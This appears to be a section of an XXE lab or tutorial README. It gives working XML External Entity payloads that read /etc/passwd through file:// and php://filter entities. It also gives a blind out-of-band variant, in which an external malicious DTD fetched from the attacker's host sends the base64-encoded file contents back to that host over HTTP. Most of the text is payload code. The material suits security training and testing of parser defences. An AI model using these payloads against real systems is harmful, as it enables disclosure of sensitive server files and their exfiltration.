### Example Payload

#### Leak /etc/passwd using file protocol

Payload:

```xml
<!DOCTYPE data [
<!ELEMENT foo ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&file;</data>
</root>
```

#### Leak /etc/passwd using php filters

Payload:

```xml
<!DOCTYPE data [
<!ELEMENT foo ANY>
<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>
    <data>&file;</data>
</root>
```

#### Leak /etc/passwd using external DTD

This technique is useful for blind XML injection. Firstly, you need to run `dtd.py` and use the payload below to fetch a malicious DTD file from your server. Make sure to replace `<your docker Host IP>` with the actual IP of your Docker host.

Payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<your docker Host IP>:5000/malicious.dtd"> %xxe;]>
<root>
    <data>&file;</data>
</root>
```

Your server will respond with the following DTD file, and the target server will execute it. As a result, it will send the content of `%file` (which contains `/etc/passwd`) to the attacker's server.

Malicious DTD file:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<your docker Host IP>:5000/?file=%file;'>">
%eval;
%exfiltrate;
```

Your server will output the following, which contains the base64 representation of /etc/passwd:

![Server Response](https://i.imgur.com/x7UZlkk.png)
